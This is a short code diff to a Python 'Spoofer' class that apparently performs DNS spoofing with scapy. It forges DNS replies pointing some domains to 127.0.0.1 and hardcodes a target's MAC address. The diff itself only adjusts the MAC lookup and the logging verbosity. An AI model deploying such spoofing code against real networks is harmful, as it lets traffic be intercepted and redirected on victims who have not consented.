@@ -16,7 +16,8 @@ class Spoofer:
         self.__target_ip = target_ip
         self.__router_ip = router_ip
         # Getting mac of the target
-        self.__target_mac = self.get_mac(self.__target_ip)
+        # self.__target_mac = self.get_mac(self.__target_ip)
+        self.__target_mac = "42:af:e2:f9:96:4a"
 
     def send_spoofed_packet(self): # Main
         """sending spoofed packet.
@@ -91,13 +92,15 @@ class Spoofer:
                         rdata="127.0.0.1"
                     )
                 )
+                ver = True
                 # record_entry(domain,self.build_dict_from_packet(packet))
             else:
+                ver = False
                 response_packet = self.nslookup(domain)
 
             response_packet[IP].src,response_packet[IP].dst = packet[IP].dst,packet[IP].src
             # Modify the response packet, so it will match target's original query.
-            scapy.send(response_packet) #type:ignore
+            scapy.send(response_packet,verbose=ver) #type:ignore
 
     def forward_to_router(self):
         """
